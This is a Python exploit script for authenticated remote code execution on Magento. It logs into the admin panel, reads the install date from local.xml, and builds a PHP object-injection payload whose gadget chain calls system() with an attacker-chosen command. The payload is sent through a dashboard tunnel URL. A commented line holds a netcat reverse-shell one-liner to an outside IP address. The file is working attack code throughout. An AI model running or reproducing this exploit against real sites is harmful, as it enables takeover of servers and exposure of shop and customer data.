import requests
import hashlib
import re
import sys
import base64
import argparse
import lxml.html
import lxml.etree
from log_colors import *

# Magento Authenticated RCE
class MagentoAuthRCE:

    def __init__(self, url, user, pswd):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pswd = user, pswd
        self.session = requests.Session()

    # login
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        r = self.session.get(self.url.rstrip("/") + "/index.php/admin/")
        tree = lxml.html.fromstring(r.text)
        key = tree.xpath('.//form[@id="loginForm"]//input[@type="hidden"]/@value')
        key = key[0]
        print (LogColors.YELLOW + "key: " + key + "..." + LogColors.ENDC)
        data = {
            "login[username]" : self.user,
            "login[password]" : self.pswd,
            "form_key" : key,
            "dummy" : "",
        }
        r = self.session.post(self.url.rstrip("/") + "/index.php/admin/", data = data)
        if r.ok:
            print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
            return r.text
        else:
            print (LogColors.RED + "login failed :(" + LogColors.ENDC)
            sys.exit()
    
    # get date from /app/etc/local.xml file
    def get_install_date(self):
        print (LogColors.BLUE + "get data param..." + LogColors.ENDC)
        r = self.session.get(self.url.rstrip("/") + "/app/etc/local.xml")
        if r.ok:
            tree = lxml.etree.fromstring(r.text)
            date = tree.xpath("//install//date")
            install_date = date[0].text.strip()
            print (LogColors.YELLOW + install_date + LogColors.ENDC)
            self.install_date = install_date
        else:
            print (LogColors.RED + "failed parse install date..." + LogColors.ENDC)
            sys.exit()

    def get_tunnel(self):
        dashboard = self.login()
        self.get_install_date()
        ajax_url = re.search("ajaxBlockUrl = \'(.*)\'", dashboard)
        ajax_url = ajax_url.group(1)
        form_key = re.search("var FORM_KEY = '(.*)'", dashboard)
        key = form_key.group(1)
        print (LogColors.YELLOW + ajax_url + " " + key + LogColors.ENDC)
        data = {"isAjax" : "false", "form_key" : key}
        print (LogColors.BLUE + "get tunnel..." + LogColors.ENDC)
        r = self.session.post(
            ajax_url + 'block/tab_orders/period/2y/?isAjax=true',
            data = data
        )
        if r.ok:
            tunnel = re.search("src=\"(.*)\?ga=", r.text)
            tunnel = tunnel.group(1)
            print (LogColors.YELLOW + tunnel + LogColors.ENDC)
            return tunnel
        else:
            print (LogColors.RED + "error get tunnel :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic, cmd - command for example "whoami" or "uname -a"
    def exploit(self, cmd):
        tunnel = self.get_tunnel()
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        php_function = 'system'
        payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:'
        payload += '{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:'
        payload += '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";'
        payload += 'i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"'
        payload += 'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;'
        payload += 's:10:\"\00*\00_layout\";O:23:\"'
        payload += 'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:'
        payload += '%d' % len(php_function)
        payload += ':\"%s\";s:17:\"\00*\00' % php_function
        payload += '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1'
        payload += ':{s:8:\"\00*\00_data\"'
        payload += ';s:%d:' % len(cmd)
        payload += '\"%s\"' % cmd
        payload += ';}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}'
        
        payload = base64.b64encode(payload.encode()).decode()
        gh = hashlib.md5((payload + self.install_date).encode()).hexdigest()
        exploitation_url = tunnel + '?ga=' + payload + '&h=' + gh
        print (LogColors.YELLOW + exploitation_url + "..." + LogColors.ENDC)
        try:
            r = self.session.get(exploitation_url)
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
            print (LogColors.GREEN + r.text + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "sending payload failed :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-user','--username', required = True, help = "auth username")
    parser.add_argument('-pswd','--password', required = True, help = "auth password")
    args = vars(parser.parse_args())
    url = args["url"]
    user, pswd = args["username"], args["password"]
    cve = MagentoAuthRCE(url, user, pswd)
    cve.exploit("whoami")
    #cve.exploit('ls')
    #cve.exploit("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f")

